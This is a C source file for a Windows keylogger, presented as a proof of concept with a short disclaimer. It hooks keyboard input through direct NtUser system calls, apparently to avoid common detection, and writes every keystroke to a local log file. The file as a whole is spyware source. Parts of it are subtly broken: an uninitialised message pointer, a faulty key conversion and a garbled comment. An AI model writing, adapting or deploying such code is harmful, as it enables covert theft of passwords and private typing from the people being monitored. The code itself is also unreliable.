#include <windows.h>
#include <stdio.h>

#include "syscalls.h"
#include "keylogger.h"

/*
 * THIS IS A PROOF OF CONCEPT
 * DO NOT USE THIS ON MACHINES
 * YOU DO NOT HAVE EXPLICIT
 * PERMISSION TO MONITOR
 */

HHOOK hook;
LPMSG msg;
FILE *LOG;


LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= HC_ACTION && LOG) {
        if (wParam == WM_KEYDOWN) {
            // Convert lParam to char or appropriate format
            // This is a placeholder, actual this is a keyloggerconversion might be more complex
            char key = *(char*)lParam;

            // Write the key to the file
            fputc(key, LOG);
            fflush(LOG); // Optionally flush the file
        }
    }

    return CallNextHookEx(hook, code, wParam, lParam);
}


void do_keylogger() {
    errno_t err = fopen_s(&LOG, "LOG.txt", "a+");
    if (err) {
        exit(err);
    }

    hook = NtUserSetWindowsHookEx(NULL, NULL, 0, WH_KEYBOARD_LL, KeyboardProc, 2u);

    while(NtUserGetMessage(msg, NULL, 0, 0) > 0) {
        NtUserTranslateMessage(msg, 0);
        NtUserDispatchMessage(msg);
    }

    if(LOG) {
        fclose(LOG);
    }
}